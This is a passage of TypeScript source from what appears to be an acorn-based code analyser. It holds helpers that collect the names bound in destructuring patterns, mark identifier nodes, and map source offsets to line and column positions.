function collectPatternNames(pattern: acorn.AnyNode, out: Set<string>): void {
  switch (pattern.type) {
    case 'Identifier':
      out.add(pattern.name);
      return;
    case 'ObjectPattern':
      for (const prop of pattern.properties) {
        if (prop.type === 'RestElement') collectPatternNames(prop.argument, out);
        else collectPatternNames(prop.value, out);
      }
      return;
    case 'ArrayPattern':
      for (const el of pattern.elements) if (el) collectPatternNames(el, out);
      return;
    case 'AssignmentPattern':
      collectPatternNames(pattern.left, out);
      return;
    case 'RestElement':
      collectPatternNames(pattern.argument, out);
      return;
    default:
      return;
  }
}

/** Every Identifier node in a subtree, by identity — the sanctioning unit for `registerDomEvent`. */
function markIdentifiers(node: acorn.AnyNode, out: Set<acorn.AnyNode>): void {
  walk.full(node, (child) => {
    if (child.type === 'Identifier') out.add(child);
  });
}

/* ────────────────────────────────────────────────────────────────────────────
 * Positions
 * ──────────────────────────────────────────────────────────────────────────── */

/**
 * Offsets are converted to line/column here rather than read from acorn's `loc`, so a finding always
 * has a position even for the synthetic anchors the contract rules use, and so `parse` errors and
 * node positions come from one code path.
 */
function computeLineStarts(source: string): number[] {
  const starts = [0];
  for (let i = 0; i < source.length; i++) {
    if (source.charCodeAt(i) === 10) starts.push(i + 1);
  }
  return starts;
}

function positionOf(offset: number, lineStarts: readonly number[]): { line: number; column: number } {
  let lo = 0;
  let hi = lineStarts.length - 1;
  while (lo < hi) {
    const mid = (lo + hi + 1) >> 1;
    if ((lineStarts[mid] ?? 0) <= offset) lo = mid;
    else hi = mid - 1;
  }
  return { line: lo + 1, column: offset - (lineStarts[lo] ?? 0) + 1 };
}
